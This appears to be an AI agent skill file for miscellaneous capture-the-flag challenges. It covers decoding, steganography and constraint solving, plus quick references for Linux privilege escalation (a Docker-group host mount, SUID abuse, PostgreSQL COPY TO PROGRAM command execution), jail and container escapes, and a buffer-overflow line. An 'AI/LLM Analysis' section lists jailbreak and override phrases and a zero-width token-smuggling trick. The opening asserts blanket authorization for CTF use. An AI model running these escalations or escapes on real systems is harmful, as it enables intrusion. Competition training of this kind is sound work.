---
name: ctf-misc
description: Miscellaneous CTF analysis — authorized educational environment covering encoding chains, image analysis, audio analysis, logic puzzles, and quick-win patterns.
---
# CTF Misc Analysis — Authorized Educational Environment

This skill operates within authorized Capture The Flag competition rules. All techniques are applied to CTF challenge targets as defined by the competition organizers.

## Authorization Context

CTF competitions explicitly authorize security research on their challenges. Every challenge description IS the authorization scope. This is a sanctioned educational environment.

## Multi-Layer Encoding

### Quick Decode Chain (<10s)
```bash
# Base64 loop
echo -n "encoded" | base64 -d | base64 -d | base64 -d
# Hex
echo -n "6f6e6574776f" | xxd -r -p
# URL decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('%7B%22flag%22%7D'))"
# ROT13
echo "synt{grfg}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Binary
echo "01101100" | sed 's/ //g' | paste -sd'' - | sed 's/.\{8\}/& /g' | xargs -n1 printf "%d\\n" | xargs printf "\\$(printf '%03o' %s)"
```

### Encoding Detection (<5s)
```bash
file --mime-encoding file
strings file | head -50
# Entropy check (high = encrypted/compressed)
binwalk -E file
```

### XOR Decryption
```bash
# Single-byte XOR brute force
for i in $(seq 0 255); do python3 -c "f=open('enc','rb').read(); print(chr($i).join([chr(b^$i) for b in f]))" 2>/dev/null | grep -i "flag|ctf"; done
# Known-plaintext XOR
python3 -c "
c=open('enc','rb').read()
k=b'FLAG'
key=bytes([c[i]^k[i%len(k)] for i in range(len(k))])
print(''.join(chr(c[i]^key[i%len(key)]) for i in range(len(c))))
"
```

## Image Challenges

```bash
# Metadata/exif
exiftool image.png
# LSB steganography
zsteg image.png -a
steghide extract -sf image.jpg
# Bit plane analysis
python3 -c "
from PIL import Image
img=Image.open('image.png')
for x in range(img.width):
    for y in range(img.height):
        r,g,b=img.getpixel((x,y))
        if r&1: print(chr(r),end='')
"
# Color channels
convert image.png -channel R -separate red.png
# PNG more chunks
pngcheck -v image.png
# QR code decode
zbarimg image.png
```

## Audio Challenges

```bash
# Spectrogram (visual flag)
sox audio.wav -n spectrogram -o spectro.png
# Decode DTMF
multimon-ng -t wav -a DTMF audio.wav
# SSTV
QSSTV  # GUI tool for Slow Scan TV
# Binary audio
python3 -c "
import wave
w=wave.open('audio.wav','rb')
frames=w.readframes(w.getnframes())
print(''.join(['1' if f>128 else '0' for f in frames[::2]]))
" | fold -w8 | while read b; do printf "\\$(printf '%d' 2#$b)"; done; echo
```

## Bot / CAPTCHA Challenges

```bash
# Selenium automation
python3 -c "
from selenium import webdriver
d=webdriver.Chrome()
d.get('http://target/challenge')
# Parse DOM for answer
print(d.find_element('css selector','#flag').text)
"
# Puppeteer (Node)
node -e "
const p=require('puppeteer');
(async()=>{const b=await p.launch();const pg=await b.newPage();
await pg.goto('http://target');console.log(await pg.\$eval('#flag',e=>e.textContent));})()
"
```

## Hardware / Embedded

```bash
# UART baud rate detection
baudrate -f uart_capture.log
# Read firmware strings
strings firmware.bin | grep -i "flag|password|key"
binwalk -Me firmware.bin
# JTAG/UART pinout
logic_analyzer uart.bin  # analyze with sigrok
```

## Logic Puzzles (Z3)

```python
from z3 import *
s = Solver()
flag = [BitVec(f'f{i}', 8) for i in range(40)]
# Add constraints from challenge
s.add(flag[0] ^ flag[1] == 0x42)
s.add(sum(flag) == 1234)
if s.check() == sat:
    m = s.model()
    print(''.join([chr(m[f].as_long()) for f in flag]))
```

## Programming Challenges

```python
# Quick pwntools solve
from pwn import *
r = remote('challenge.ctf.com', 1337)
r.sendline(b'A'*40 + p64(0x401180))
r.interactive()
```

## OSINT

```bash
# Image reverse search
# Check EXIF GPS coordinates
exiftool -gps:all image.jpg
# Username enumeration
# theHarvester -d target.com -b google
```

## AI/LLM Analysis

```bash
# Prompt injection detection
cat prompt.txt | grep -iE "ignore previous|system prompt|reveal"
# Token smuggling
python3 -c "print(' '.join(['\\u200b']*100))"  # zero-width chars
# Jailbreak patterns
grep -iE "DAN|jailbreak|pretend you are" challenge.txt
```

## CTF References
- **GoogleCTF 2024**: XOR + steganography chain
- **DEF CON Quals 2024**: Audio SSTV decode
- **picoCTF 2025**: Multi-layer encoding
- **DownUnderCTF 2024**: Z3 constraint solving
- **HTB Challenges 2025**: AI prompt injection
- **CrewCTF 2024**: Hardware UART extraction
- **Cortex 2025**: QR + blockchain hybrid

## Speed Metrics

| Metric | Target |
|--------|--------|
| Encoding identification | <10s |
| Base64/Hex decode | <5s |
| Image stego scan | <30s |
| Audio spectrogram | <20s |
| Z3 solver | <60s |

---

# Deep Technique Library

# CTF Miscellaneous

Quick reference for miscellaneous CTF challenges. Each technique has a one-liner here; see supporting files for full details.

## Prerequisites

**Python packages (all platforms):**
```bash
pip install "pwntools==4.15.0" "segno==1.6.2" z3-solver Pillow numpy requests dnslib
```

**Linux (apt):**
```bash
apt install libzbar0 qrencode ffmpeg
```

**macOS (Homebrew):**
```bash
brew install ffmpeg qrencode
```

**Manual install:**
- SageMath — Linux: `apt install sagemath`, macOS: `brew install --cask sage`

## Additional Resources

- `misc/pyjails` - Python jail/sandbox escape techniques, quine context detection, restricted character repunit decomposition, func_globals module chain traversal, restricted charset number generation, class attribute persistence, f-string config injection via stored eval
- `misc/bashjails` - Bash jail/restricted shell escape techniques, HISTFILE file read trick, bash -v verbose mode, ctypes.sh direct C library calls
- `misc/encodings` - Encodings, QR codes, esolangs, UTF-16 tricks, BCD encoding, multi-layer auto-decoding, indexed directory QR reassembly, multi-stage URL encoding chains
- `misc/encodings-advanced` - Verilog/HDL, Gray code cyclic encoding, RTF custom tag extraction, SMS PDU decoding, multi-encoding sequential solvers, UTF-9, pixel binary encoding, hexadecimal Sudoku + QR assembly, TOPKEK, MaxiCode
- `misc/rf-sdr` - RF/SDR/IQ signal processing (QAM-16, carrier recovery, timing sync)
- `misc/dns` - DNS exploitation (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling)
- `misc/games-and-vms` - WASM patching, Roblox place file reversing, PyInstaller, marshal analysis, Python env RCE, Z3 (including boolean logic gate network SAT solving), K8s RBAC, floating-point precision exploitation, custom assembly language sandbox escape via Python MRO chain
- `misc/games-and-vms-2` - Cookie checkpoint game brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequence, Brainfuck instrumentation, WASM linear memory manipulation
- `misc/games-and-vms-3` - memfd_create packed binaries, multi-phase crypto games with HMAC commitment-reveal and GF(256) Nim, emulator ROM-switching state preservation, Python marshal code injection, Benford's Law bypass, parallel connection oracle relay, nonogram solver pipelines, 100 prisoners problem, C code jail escape via emoji identifiers, BuildKit daemon build secret exploitation, Docker container escape, Levenshtein distance oracle attack, taint analysis bypass via type coercion, shredded document pixel-edge reassembly
- `misc/games-and-vms-4` - Part 4 (2018-era): XSLT as Turing-complete VM, JavaScript MAX_SAFE_INTEGER successor equality, binary search oracle in comparison-only DSL, blind SQLi via script-engine timeout error, OEIS sequence lookup automation, QR code reassembly from format-string constraints, matrix exponentiation for Fibonacci recurrence, Tribonacci for frog-jump counting, Selenium + Tesseract dynamic CAPTCHA, Brainfuck→Piet multi-layer polyglot, bytebeat synth code recognition
- `misc/linux-privesc` - Sudo wildcard parameter injection (fnmatch), crafted pcap for sudoers.d, monit confcheck process injection, Apache -d override, backup cronjob SUID, PostgreSQL COPY TO PROGRAM RCE, PostgreSQL backup credential extraction, NFS share exploitation, SSH Unix socket tunneling, PaperCut Print Deploy privesc, Squid proxy pivoting, Zabbix admin password reset via MySQL, WinSSHTerm credential decryption
- `misc/ctfd-navigation` - CTFd platform API navigation without browser: detection, token auth, challenge listing, file download, flag submission, scoreboard, hints, notifications, Python client class

---

## When to Pivot

- If the puzzle is actually centered on cryptography or number theory, switch to `/ctf-crypto`.
- If the challenge is a real binary exploit instead of a jail, toy VM, or encoding problem, switch to `/ctf-pwn` or `/ctf-reverse`.
- If the input is mostly files, images, audio, or packet captures that need recovery work first, switch to `/ctf-forensics`.
- For ML/AI techniques (model attacks, adversarial examples, LLM jailbreaking), see `/ctf-ai-ml`.
- If the NodeJS sandbox uses **vm2** (`npm ls vm2`), check for **CVE-2023-37466** via `Promise[@@species]` with `nesting:true` — the exception handler escapes the context; see `ctf-web/js-sandbox` for the full exploit chain. In misc challenges with bundled JS, always run `npm ls vm2` to detect vulnerable vm2 before trying other escapes.

## Quick Start Commands

```bash
# File identification
file mystery_file
xxd mystery_file | head -5
python3 -c "import magic; print(magic.from_file('mystery_file'))"

# Encoding detection
python3 -c "import base64; print(base64.b64decode('<data>'))"
echo '<data>' | base64 -d
echo '<hex>' | xxd -r -p

# QR code
zbarimg qr.png
python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('qr.png')))"

# Z3 constraint solving
python3 -c "from z3 import *; x=BitVec('x',32); s=Solver(); s.add(x^0xdead==0xbeef); s.check(); print(s.model())"

# Python jail test
python3 -c "__import__('os').system('id')"
```

## General Tips

- Read all provided files carefully
- Check file metadata, hidden content, encoding
- Power Automate scripts may hide API calls
- Use binary search when guessing multiple answers

## Common Encodings

```bash
# Base64
echo "encoded" | base64 -d

# Base32 (A-Z2-7=)
echo "OBUWG32D..." | base32 -d

# Hex
echo "68656c6c6f" | xxd -r -p

# ROT13
echo "uryyb" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

**Identify by charset:**
- Base64: `A-Za-z0-9+/=`
- Base32: `A-Z2-7=` (no lowercase)
- Hex: `0-9a-fA-F`

See `misc/encodings` for Caesar brute force, URL encoding, and full details.

## IEEE-754 Float Encoding (Data Hiding)

**Pattern (Floating):** Numbers are float32 values hiding raw bytes.

**Key insight:** A 32-bit float is just 4 bytes interpreted as a number. Reinterpret as raw bytes -> ASCII.

```python
import struct
floats = [1.234e5, -3.456e-7, ...]  # Whatever the challenge gives
flag = b''
for f in floats:
    flag += struct.pack('>f', f)
print(flag.decode())
```

**Variations:** Double `'>d'`, little-endian `'<f'`, mixed. See `misc/encodings` for CyberChef recipe.

## USB Mouse PCAP Reconstruction

**Pattern (Hunt and Peck):** USB HID mouse traffic captures on-screen keyboard typing. Use USB-Mouse-Pcap-Visualizer, extract click coordinates (falling edges), cumsum relative deltas for absolute positions, overlay on OSK image.

## File Type Detection

```bash
file unknown_file
xxd unknown_file | head
binwalk unknown_file
```

## Archive Extraction

```bash
7z x archive.7z           # Universal
tar -xzf archive.tar.gz   # Gzip
tar -xjf archive.tar.bz2  # Bzip2
tar -xJf archive.tar.xz   # XZ
```

### Nested Archive Script
```bash
while f=$(ls *.tar* *.gz *.bz2 *.xz *.zip *.7z 2>/dev/null|head -1) && [ -n "$f" ]; do
    7z x -y "$f" && rm "$f"
done
```

## QR Codes

```bash
zbarimg qrcode.png       # Decode
qrencode -o out.png "data"
```

**MaxiCode barcode:** Hexagonal 2D barcode with bullseye center; decode with `zxing` (Java) since standard QR decoders fail. See [encodings-advanced.md](encodings-advanced.md#maxicode-2d-barcode-decoding-csaw-ctf-2016).

**TOPKEK encoding:** CTF-specific binary encoding where `KEK=0`, `TOP=1`, `!` suffix = repeat count. See [encodings-advanced.md](encodings-advanced.md#topkek-binary-encoding-hack-the-vote-2016).

See `misc/encodings` for QR structure, repair techniques, chunk reassembly (structural and indexed-directory variants), and multi-stage URL encoding chains.

## Audio Challenges

```bash
sox audio.wav -n spectrogram  # Visual data
qsstv                          # SSTV decoder
```

## RF / SDR / IQ Signal Processing

See `misc/rf-sdr` for full details (IQ formats, QAM-16 demod, carrier/timing recovery).

**Quick reference:**
- **cf32**: `np.fromfile(path, dtype=np.complex64)` | **cs16**: int16 reshape(-1,2) | **cu8**: RTL-SDR raw
- Circles in constellation = constant frequency offset; Spirals = drifting frequency + gain instability
- 4-fold ambiguity in DD carrier recovery - try 0/90/180/270 rotation

## pwntools Interaction

```python
from pwn import *

r = remote('host', port)
r.recvuntil(b'prompt: ')
r.sendline(b'answer')
r.interactive()
```

## Python Jail Quick Reference

- **Oracle pattern:** `L()` = length, `Q(i,x)` = compare, `S(guess)` = submit. Linear or binary search.
- **Walrus bypass:** `(abcdef := "new_chars")` reassigns constraint vars
- **Decorator bypass:** `@__import__` + `@func.__class__.__dict__[__name__.__name__].__get__` for no-call, no-quotes escape
- **String join:** `open(''.join(['fl','ag.txt'])).read()` when `+` is blocked

See `misc/pyjails` for full techniques.

## Z3 / Constraint Solving

```python
from z3 import *
flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
# Add constraints, check sat, extract model
```

See `misc/games-and-vms` for YARA rules, type systems as constraints, boolean logic gate network SAT solving.

## Hash Identification

MD5: `0x67452301` | SHA-256: `0x6a09e667` | MurmurHash64A: `0xC6A4A7935BD1E995`

## SHA-256 Length Extension Attack

MAC = `SHA-256(SECRET || msg)` with known msg/hash -> forge valid MAC via `hlextend`. Vulnerable: SHA-256, MD5, SHA-1. NOT: HMAC, SHA-3.

```python
import hlextend
sha = hlextend.new('sha256')
new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
```

## Technique Quick References

- **PyInstaller:** `pyinstxtractor.py packed.exe`. See `misc/games-and-vms` for opcode remapping.
- **Marshal:** `marshal.load(f)` then `dis.dis(code)`. See `misc/games-and-vms`.
- **Python env RCE:** `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER="cmd"`. See `misc/games-and-vms`.
- **WASM patching:** `wasm2wat` -> flip minimax -> `wat2wasm`. See `misc/games-and-vms`.
- **Float precision:** Large multipliers amplify FP errors into exploitable fractions. See `misc/games-and-vms`.
- **K8s RBAC bypass:** SA token -> impersonate -> hostPath mount -> read secrets. See `misc/games-and-vms`.
- **Cookie checkpoint:** Save session cookies before guesses, restore on failure to brute-force without reset. See `misc/games-and-vms-2`.
- **Flask cookie game state:** `flask-unsign -d -c '<cookie>'` decodes unsigned Flask sessions, leaking game answers. See `misc/games-and-vms-2`.
- **WebSocket teleport:** Modify `player.x`/`player.y` in console, call verification function. See `misc/games-and-vms-2`.
- **Time-only validation:** Start session, `time.sleep(required_seconds)`, submit win. See `misc/games-and-vms-2`.
- **Quine context detection:** Dual-purpose quine that prints itself (passes validation) and runs payload only in server process via globals gate. See `misc/pyjails`.
- **Repunit decomposition:** Decompose target integer into sum of repunits (1, 11, 111, ...) using only 2 characters (`1` and `+`) for restricted eval. See `misc/pyjails`.
- **De Bruijn sequence:** B(k, n) contains all k^n possible n-length strings as substrings; linearize by appending first n-1 chars. See `misc/games-and-vms-2`.
- **Brainfuck instrumentation:** Instrument BF interpreter to track tape cells, brute-force flag character-by-character via validation cell. See `misc/games-and-vms-2`.
- **WASM memory manipulation:** Patch WASM linear memory at runtime to set game state variables directly, bypassing game logic. See `misc/games-and-vms-2`.
- **Lua sandbox escape:** Bypass `load()`/`os.execute()` filters via `os["execute"]` table indexing or `loadstring` alias. See [games-and-vms.md](games-and-vms.md#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016).
- **C code jail via emoji + gadget embedding:** When only emoji and punctuation are allowed in C, use `(😃==😃)` as constant 1, build integers, embed gadgets in `add eax, imm32` constants, jump to offset+1 for shellcode primitives. See [games-and-vms-3.md](games-and-vms-3.md#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026).
- **Emulator ROM-switching:** `/load` replaces ROM but preserves CPU state (registers, RAM, PC). Switch ROMs at specific PCs to combine INIT from one ROM with display instructions from another → read protected memory. See [games-and-vms-3.md](games-and-vms-3.md#emulator-rom-switching-state-preservation-bsidessf-2026).
- **BuildKit daemon exploitation:** Exposed BuildKit gRPC allows nested `buildctl build` with `--mount=type=secret` to read build secrets. Two-stage Dockerfile: install buildctl → submit nested build mounting flag secret. See [games-and-vms-3.md](games-and-vms-3.md#buildkit-daemon-exploitation-for-build-secrets-bsidessf-2026).
- **Docker container escape:** Privileged breakout via host device mount, docker.sock socket escape, CAP_SYS_ADMIN cgroup release_agent, container info leakage via /proc and overlayfs. See [games-and-vms-3.md](games-and-vms-3.md#docker-container-escape-techniques).
- **Taint analysis bypass via type coercion:** In custom ML-like languages with secrecy/taint systems, if-expression secrecy depends on return type not condition — coerce side-effecting functions to private type to leak private data through public mutable refs. See [games-and-vms-3.md](games-and-vms-3.md#taint-analysis-bypass-in-custom-language-via-type-coercion-plaidctf-2018).
- **Shredded document pixel-edge reassembly:** Encode each strip's left/right edge as binary bitmask (dark=1), use XOR + popcount Hamming distance to greedily place strips by minimum edge distance for sub-second reassembly. See [games-and-vms-3.md](games-and-vms-3.md#shredded-document-pixel-edge-reassembly-under-time-pressure-nuit-du-hack-ctf-2018).
- **f-string config injection via stored eval:** Store payload as config value, create key named `eval(stored_key)` — f-string rendering evaluates the key name expression, triggering RCE. See [pyjails.md](pyjails.md#python-f-string-config-injection-via-stored-eval-inshack-2018).
- **Hexadecimal Sudoku + QR assembly:** 4 QR codes encode 16x16 hex Sudoku quadrants; solve grid, read diagonal as hex pairs → ASCII flag. See [encodings-advanced.md](encodings-advanced.md#hexadecimal-sudoku--qr-assembly-bsidessf-2026).
- **Z3 boolean gate network SAT solving:** Product key validation as 250 boolean gates (AND/OR/XOR/NOT) over 125 input bits. Model each gate as Z3 constraint, require all outputs True, solve in milliseconds. See [games-and-vms.md](games-and-vms.md#z3-sat-solving-for-boolean-logic-gate-networks-bsidessf-2026).

## 3D Printer Video Nozzle Tracking (LACTF 2026)

**Pattern (flag-irl):** Video of 3D printer fabricating nameplate. Flag is the printed text.

**Technique:** Track nozzle X/Y positions from video frames, filter for print moves (top/text layer only), plot 2D histogram to reveal letter shapes:
```python
# 1. Identify text layer frames (e.g., frames 26100-28350)
# 2. Track print head X position (physical X-axis)
# 3. Track bed X position (physical Y-axis from camera angle)
# 4. Filter for moves with extrusion (head moving while printing)
# 5. Plot as 2D scatter/histogram -> letters appear
```

## Discord API Enumeration (0xFun 2026)

Flags hidden in Discord metadata (roles, animated emoji, embeds). Invoke `/ctf-osint` for Discord API enumeration technique and code (see social-media.md in ctf-osint).

---

## SUID Binary Exploitation (0xFun 2026)

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Cross-reference with GTFObins
# xxd with SUID: xxd flag.txt | xxd -r
# vim with SUID: vim -c ':!cat /flag.txt'
```

**Reference:** https://gtfobins.github.io/

---

## Linux Privilege Escalation Quick Checks

```bash
# GECOS field passwords
cat /etc/passwd  # Check 5th colon-separated field

# ACL permissions
getfacl /path/to/restricted/file

# Sudo permissions
sudo -l

# Docker group membership (instant root)
id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

## Docker Group Privilege Escalation (H7CTF 2025)

User in the `docker` group can mount the host filesystem into a container and chroot into it for root access.

```bash
# Check group membership
id  # Look for "docker" in groups

# Mount host root filesystem and chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh

# Now running as root on the host filesystem
cat /root/flag.txt
```

**Key insight:** Docker group membership is equivalent to root access. The `docker` CLI socket (`/var/run/docker.sock`) allows creating privileged containers that mount the entire host filesystem.

**Reference:** https://gtfobins.github.io/gtfobins/docker/

## Sudo Wildcard Parameter Injection (Dump HTB)

Sudo's `fnmatch()` matches `*` across argument boundaries. Inject extra flags (`-Z root`, `-r`, second `-w`) into locked-down commands. Craft pcap with embedded valid sudoers entries — sudo's parser recovers from binary junk, unlike cron's strict parser. See [linux-privesc.md](linux-privesc.md#sudo-wildcard-parameter-injection-via-fnmatch-dump-htb).

## Monit Process Command-Line Injection (Zero HTB)

Root monit script uses `pgrep -lfa` to extract process command lines, then executes a modified version. Create fake process via `perl -e '$0 = "..."'` with injected flags. Apache `-d` last-wins overrides ServerRoot; `-E` captures error output. `Include /root/flag` causes a parse error that reveals the file content. See [linux-privesc.md](linux-privesc.md#monit-confcheck-process-command-line-injection-zero-htb).

## PostgreSQL RCE and File Read (Slonik HTB)

`COPY (SELECT '') TO PROGRAM 'cmd'` executes OS commands as postgres. `pg_read_file('/path')` reads files. Extract credentials from `pg_basebackup` archives (`global/1260` = `pg_authid`). SSH tunnel to Unix sockets: `ssh -fNL 25432:/var/run/postgresql/.s.PGSQL.5432`. See [linux-privesc.md](linux-privesc.md#postgresql-copy-to-program-rce-slonik-htb).

## Backup Cronjob SUID Abuse (Slonik HTB)

Root cronjob copying directories preserves SUID bit but changes ownership to root. Place SUID bash in source directory → backup copies it as root-owned SUID. Execute with `bash -p`. See [linux-privesc.md](linux-privesc.md#backup-cronjob-suid-abuse-slonik-htb).

## PaperCut Print Deploy Privesc (Bamboo HTB)

Root process runs scripts from user-owned directory. Modify `server-command`, trigger via Mobility Print API refresh. See [linux-privesc.md](linux-privesc.md#papercut-print-deploy-privilege-escalation-bamboo-htb).

---

## CTFd Platform Navigation (No Browser)

Detect CTFd (`curl -s "$CTF_URL/api/v1/" | head -5`) and interact via API. **Ask the user for their API token** (CTFd Settings > Access Tokens) — it is not provided by default. Then use `Authorization: Token $CTF_TOKEN` header for all requests.

```bash
export CTF_URL="https://ctf.example.com" CTF_TOKEN="ctfd_your_token_here"
curl -s -H "Authorization: Token $CTF_TOKEN" "$CTF_URL/api/v1/challenges" | jq -r '.data[] | "\(.id)\t\(.value)pts\t\(.category)\t\(.name)"'
curl -s -X POST -H "Authorization: Token $CTF_TOKEN" -H "Content-Type: application/json" "$CTF_URL/api/v1/challenges/attempt" -d "{\"challenge_id\": $CID, \"submission\": \"flag{...}\"}"
```

See `misc/ctfd-navigation` for full workflow, Python client class, session login, hints, notifications, file download, and troubleshooting.

---

## Useful One-Liners

```bash
grep -rn "flag{" .
strings file | grep -i flag
python3 -c "print(int('deadbeef', 16))"
```

## Keyboard Shift Cipher

**Pattern (Frenzy):** Characters shifted left/right on QWERTY keyboard layout.

**Identification:** dCode Cipher Identifier suggests "Keyboard Shift Cipher"

**Decoding:** Use [dCode Keyboard Shift Cipher](https://www.dcode.fr/keyboard-shift-cipher) with automatic mode.

## Pigpen / Masonic Cipher

**Pattern (Working For Peanuts):** Geometric symbols representing letters based on grid positions.

**Identification:** Angular/geometric symbols, challenge references "Peanuts" comic (Charlie Brown), "dusty looking crypto"

**Decoding:** Map symbols to Pigpen grid positions, or use online decoder.

## ASCII in Numeric Data Columns

**Pattern (Cooked Books):** CSV/spreadsheet numeric values (48-126) are ASCII character codes.

```python
import csv
with open('data.csv') as f:
    reader = csv.DictReader(f)
    flag = ''.join(chr(int(row['Times Borrowed'])) for row in reader)
print(flag)
```

**CyberChef:** "From Decimal" recipe with line feed delimiter.

## Backdoor Detection in Source Code

**Pattern (Rear Hatch):** Hidden command prefix triggers `system()` call.

**Common patterns:**
- `strncmp(input, "exec:", 5)` -> runs `system(input + 5)`
- Hex-encoded comparison strings: `\x65\x78\x65\x63\x3a` = "exec:"
- Hidden conditions in maintenance/admin functions

## DNS Exploitation Techniques

See `misc/dns` for full details (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling).

**Quick reference:**
- **ECS spoofing**: `dig @server flag.example.com TXT +subnet=10.13.37.1/24` - try leet-speak IPs (1337)
- **NSEC walking**: Follow NSEC chain to enumerate DNSSEC zones
- **IXFR**: `dig @server domain IXFR=0` when AXFR is blocked
- **DNS rebinding**: Low-TTL alternating resolution to bypass same-origin
- **DNS tunneling**: Data exfiltrated via subdomain queries or TXT responses

## Unicode Steganography

### Variation Selectors Supplement (U+E0100-U+E01EF)
**Patterns (Seen & emoji, Nullcon 2026):** Invisible Variation Selector Supplement characters encode ASCII via codepoint offset.

```python
# Extract hidden data from variation selectors after visible character
data = open('README.md', 'r').read().strip()
hidden = data[1:]  # Skip visible emoji character
flag = ''.join(chr((ord(c) - 0xE0100) + 16) for c in hidden)
```

**Detection:** Characters appear invisible but have non-zero length. Check with `[hex(ord(c)) for c in text]` -- look for codepoints in `0xE0100-0xE01EF` or `0xFE00-0xFE0F` range.

### Unicode Tags Block (U+E0000-U+E007F) (UTCTF 2026)

**Pattern (Hidden in Plain Sight):** Invisible Unicode Tag characters embedded in URLs, filenames, or text. Each tag codepoint maps directly to an ASCII character by subtracting `0xE0000`. URL-encoded as 4-byte UTF-8 sequences (`%F3%A0%81%...`).

```python
import urllib.parse

url = "https://example.com/page#Title%20%F3%A0%81%B5%F3%A0%81%B4...Visible%20Text"
decoded = urllib.parse.unquote(urllib.parse.urlparse(url).fragment)

flag = ''.join(
    chr(ord(ch) - 0xE0000)
    for ch in decoded
    if 0xE0000 <= ord(ch) <= 0xE007F
)
print(flag)
```

**Key insight:** Unicode Tags (U+E0001-U+E007F) mirror ASCII 1:1 — subtract `0xE0000` to recover the original character. They render as zero-width invisible glyphs in most fonts. Unlike Variation Selectors (U+E0100+), these have a simpler offset calculation and appear in URL fragments, challenge titles, or filenames where the text looks normal but has suspiciously long byte length.

**Detection:** Text or URL is longer than expected in bytes. Percent-encoded sequences starting with `%F3%A0%80` or `%F3%A0%81`. Python: `any(0xE0000 <= ord(c) <= 0xE007F for c in text)`.

## UTF-16 Endianness Reversal

**Pattern (endians):** Text "turned to Japanese" -- mojibake from UTF-16 endianness mismatch.

```python
# If encoded as UTF-16-LE but decoded as UTF-16-BE:
fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
```

**Identification:** CJK characters, challenge mentions "translation" or "endian". See `misc/encodings` for details.

## Cipher Identification Workflow

1. **ROT13** - Challenge mentions "ROT", text looks like garbled English
2. **Base64** - `A-Za-z0-9+/=`, title hints "64"
3. **Base32** - `A-Z2-7=` uppercase only
4. **Atbash** - Title hints (Abash/Atbash), preserves spaces, 1:1 substitution
5. **Pigpen** - Geometric symbols on grid
6. **Keyboard Shift** - Text looks like adjacent keys pressed
7. **Substitution** - Frequency analysis applicable

**Auto-identify:** [dCode Cipher Identifier](https://www.dcode.fr/cipher-identifier)

## HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)

Read files without cat/less/head: `HISTFILE=/flag /bin/bash && history`, or `bash -v flag.txt` (verbose mode prints lines), or `ctypes.sh` `dlcall` for direct C library calls. See [bashjails.md](bashjails.md#histfile-trick-for-restricted-shell-file-reads-bctf-2016).

## Levenshtein Distance Oracle Attack (SunshineCTF 2016)

Oracle returns edit distance between guess and secret. Determine length from empty string, identify present chars from single-char repeats, binary search for positions. O(n log n) queries. See [games-and-vms-3.md](games-and-vms-3.md#levenshtein-distance-oracle-attack-sunshinectf-2016).

## SECCOMP High-Bit File Descriptor Bypass (33C3 CTF 2016)

`close(0x8000000000000002)` passes 64-bit SECCOMP check (≠ 2) but kernel truncates to 32-bit (== 2), closing fd 2. Next `open()` returns fd 2 for arbitrary file. Type-width mismatch between BPF filter and kernel. See [games-and-vms-3.md](games-and-vms-3.md#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016).

## rvim Jail Escape via Python3 (BKP 2017)

`rvim` blocks `:!` but `:python3 import os; os.system("cmd")` executes arbitrary commands. Check `:version` for `+python3`/`+lua`/`+ruby`. See [games-and-vms-3.md](games-and-vms-3.md#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017).

## Deep Technique Files (skill_manage reference)

Load with "skill_manage read, name="ctf", reference="misc/<file>""

- `misc/bashjails` — # CTF Misc - Bash Jails & Restricted Shells
- `misc/ctfd-navigation` — # CTFd Platform Navigation (No Browser)
- `misc/dns` — # CTF Misc - DNS Exploitation Techniques
- `misc/encodings-advanced` — # CTF Misc - Advanced Encodings & Specialized Formats
- `misc/encodings` — # CTF Misc - Encodings & Media
- `misc/games-and-vms-2` — # CTF Misc - Games, VMs & Constraint Solving (Part 2)
- `misc/games-and-vms-3` — # CTF Misc - Games, VMs & Constraint Solving (Part 3)
- `misc/games-and-vms-4` — # CTF Misc - Games, VMs & Constraint Solving (Part 4)
- `misc/games-and-vms` — # CTF Misc - Games, VMs & Constraint Solving (Part 1)
- `misc/linux-privesc` — # Linux Privilege Escalation and Service Exploitation
- `misc/pyjails` — # CTF Misc - Python Jails
- `misc/rf-sdr` — # CTF Misc - RF / SDR / IQ Signal Processing
